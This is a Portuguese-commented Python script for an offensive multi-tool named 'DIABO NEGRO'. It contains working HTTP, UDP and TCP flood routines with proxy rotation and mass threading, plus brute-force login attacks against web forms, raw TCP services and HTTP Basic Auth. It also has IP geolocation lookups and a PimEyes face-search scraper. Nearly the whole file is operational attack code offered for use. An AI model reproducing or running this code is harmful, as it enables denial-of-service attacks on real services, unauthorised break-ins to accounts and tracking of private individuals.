import os, sys, time, random, socket, requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

# === CONFIGURAÇÕES ===
MAX_THREADS = 500
TIMEOUT = 5
PROXY_FILE = "proxy.txt"
PASSWORDS = ["123456", "password", "admin123", "root", "1234", "letmein", "qwerty", "111111", "dragon"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    # Outros user agents omitidos para brevidade
]

UDP_SIZE = 65500

# === CORES CLI ===
class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
    C = '\033[96m'; E = '\033[0m'

def clear(): os.system('cls' if os.name=='nt' else 'clear')

def banner():
    clear()
    print(f"{C.R}🔥😈 DIABO NEGRO 😈🔥{C.E}")
    print(f"{C.C}Ferramenta multi-função by SALATIEL & ZHADKYEL{C.E}")
    print("="*55)

def load_proxies():
    if os.path.exists(PROXY_FILE):
        return [l.strip() for l in open(PROXY_FILE) if l.strip()]
    return []

# === ATAQUES ===
def http_flood(url, proxy=None):
    sess = requests.Session()
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    proxies = {"http":proxy,"https":proxy} if proxy else None
    while True:
        try:
            m = random.choice(["GET","POST","PUT","DELETE","HEAD"])
            if m=="POST":
                sess.post(url, data="A"*1000, headers=headers, proxies=proxies, timeout=TIMEOUT)
            else:
                sess.get(url, headers=headers, proxies=proxies, timeout=TIMEOUT)
            print(f"[HTTP FLOOD] {m} → {url} | Proxy: {proxy or 'DIRECT'}")
        except: pass

def udp_flood(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(os.urandom(UDP_SIZE), (ip,port))
            print(f"[UDP FLOOD] {ip}:{port}")
        except: pass

def syn_flood(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            s.connect((ip,port))
            s.send(b"GET / HTTP/1.1\r\nHost: "+ip.encode()+b"\r\n\r\n")
            print(f"[SYN FLOOD] {ip}:{port}")
        except: pass
        finally: s.close()

def combo_flood(url):
    ip = url.split("//")[1].split("/")[0]
    port_tcp = 80 if url.startswith("http://") else 443
    port_udp = random.choice([53,80,443,123])
    t=100
    print(f"Iniciando combo com {t} threads...")
    with ThreadPoolExecutor(max_workers=t*3) as ex:
        for _ in range(t):
            ex.submit(http_flood, url)
            ex.submit(udp_flood, ip, port_udp)
            ex.submit(syn_flood, ip, port_tcp)

# === FORÇA BRUTA ===
def megamedusa_brute(url):
    print(f"{C.Y}MegaMedusa brute → {url}{C.E}")
    sess = requests.Session()
    for u in ["admin","user"]: 
        for p in PASSWORDS:
            try:
                r = sess.post(url, data={"username":u,"password":p}, timeout=TIMEOUT)
                if r.status_code==200 and "login" not in r.url.lower():
                    print(f"{C.G}[+] {u}:{p}{C.E}")
                    return
                print(f"[-] {u}:{p}")
            except: pass

def pandora_brute(ip, port):
    print(f"{C.Y}Pandora brute → {ip}:{port}{C.E}")
    for u in ["admin","root"]:
        for p in PASSWORDS:
            try:
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(TIMEOUT)
                s.connect((ip,port))
                s.send(f"{u}:{p}\n".encode())
                print(f"[Pandora] {u}:{p}")
                s.close()
            except: pass

def basic_auth_brute(url):
    from requests.auth import HTTPBasicAuth
    for u in ["admin","root"]:
        for p in PASSWORDS:
            try:
                r=requests.get(url, auth=HTTPBasicAuth(u,p), timeout=TIMEOUT)
                if r.status_code==200:
                    print(f"{C.G}[+] Auth success → {u}:{p}{C.E}")
                    return
                print(f"[-] {u}:{p}")
            except: pass

# === RASTREAMENTO IP ===
def trace_ip_api(ip):
    print(f"{C.C}Rastreando IP → {ip}{C.E}")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if r.get("status")=="success":
            for k in ["country","regionName","city","isp","org","lat","lon"]:
                print(f"{k.capitalize()}: {r.get(k)}")
        else:
            print("Busca falhou.")
    except Exception as e:
        print("Erro:", e)

def trace_ip_multi(ip):
    print(f"{C.C}Verificando IPinfo + ip-api{C.E}")
    try:
        r=requests.get(f"https://ipinfo.io/{ip}/json", timeout=5).json()
        print("IPinfo:", r.get("org"), r.get("country"), r.get("timezone"))
    except: pass
    trace_ip_api(ip)

# === PIMEYES ===
def pimeyes_search(query):
    print(f"{C.Y}Buscando no PimEyes → '{query}'{C.E}")
    try:
        r = requests.get("https://pimeyes.com/pt/search", headers={"User-Agent":random.choice(USER_AGENTS)}, params={"search":query}, timeout=10)
        soup=BeautifulSoup(r.text,"html.parser")
        res=soup.select(".results__result")
        if not res:
            print("Nenhum resultado.")
            return
        for i,el in enumerate(res[:5]):
            link=el.find("a",href=True)["href"]
            img=el.find("img",src=True)["src"]
            print(f"{i+1}. Link: https://pimeyes.com{link}\n   Img: {img}")
    except Exception as e:
        print("Erro:", e)

# === MENUS ===
def menu():
    banner()
    print(f"{C.Y}1{C.E} - Ataques")
    print(f"{C.Y}2{C.E} - Força Bruta")
    print(f"{C.Y}3{C.E} - Rastreamento IP")
    print(f"{C.Y}4{C.E} - PimEyes Search")
    print(f"{C.Y}0{C.E} - Sair")
    return input("Escolha: ").strip()

def menu_ataques():
    clear(); print(f"{C.R}=== ATAQUES ==={C.E}")
    print("1 - HTTP Flood\n2 - UDP Flood\n3 - SYN Flood\n4 - Combo\n0 - Voltar")
    return input("Opção: ").strip()

def menu_brute():
    clear(); print(f"{C.R}=== FORÇA BRUTA ==={C.E}")
    print("1 - MegaMedusa (HTTP POST)\n2 - Pandora (TCP)\n3 - HTTP Basic Auth\n0 - Voltar")
    return input("Opção: ").strip()

def menu_trace():
    clear(); print(f"{C.R}=== RASTREAMENTO IP ==={C.E}")
    print("1 - Trace IP\n0 - Voltar")
    return input("Opção: ").strip()

def menu_pimeyes():
    clear(); print(f"{C.R}=== PIMEYES ==={C.E}")
    print("1 - Buscar\n0 - Voltar")
    return input("Opção: ").strip()

# === LOOP PRINCIPAL ===
def main():
    while True:
        op = menu()
        if op=="1":
            ao = menu_ataques()
            if ao=="1":
                url=input("URL alvo: ")
                t=int(input("Threads: "))
                ps=load_proxies()
                with ThreadPoolExecutor(t) as ex:
                    for _ in range(t):
                        ex.submit(http_flood, url, random.choice(ps) if ps else None)
            elif ao=="2":
                ip=input("IP alvo: "); port=int(input("Porta UDP: ")); t=int(input("Threads: "))
                with ThreadPoolExecutor(t) as ex:
                    for _ in range(t): ex.submit(udp_flood, ip, port)
            elif ao=="3":
                ip=input("IP alvo: "); port=int(input("Porta TCP: ")); t=int(input("Threads: "))
                with ThreadPoolExecutor(t) as ex:
                    for _ in range(t): ex.submit(syn_flood, ip, port)
            elif ao=="4":
                combo_flood(input("URL alvo (http://...): "))
        elif op=="2":
            bo = menu_brute()
            if bo=="1": megamedusa_brute(input("URL login endpoint: "))
            elif bo=="2": pandora_brute(input("IP alvo: "),int(input("Porta TCP: ")))
            elif bo=="3": basic_auth_brute(input("URL Basic Auth: "))
        elif op=="3":
            tr = menu_trace()
            if tr=="1": trace_ip_multi(input("IP para rastrear: "))
        elif op=="4":
            pm = menu_pimeyes()
            if pm=="1": pimeyes_search(input("Termo ou URL: "))
        elif op=="0":
            print(f"{C.G}Encerrando o DIABO NEGRO...{C.E}")
            sys.exit()
        else:
            print(f"{C.R}Opção inválida.{C.E}")
        time.sleep(1)

if __name__=="__main__": main()

